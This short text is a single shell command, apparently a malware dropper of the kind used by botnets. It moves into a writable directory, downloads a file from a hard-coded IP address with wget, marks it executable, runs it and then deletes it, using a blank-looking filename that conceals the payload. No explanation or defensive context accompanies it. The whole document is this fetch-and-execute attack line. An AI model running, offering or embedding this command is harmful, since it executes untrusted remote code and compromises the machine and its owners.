cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.221/' '; chmod +x ' '; ./' '; rm -rf ' '
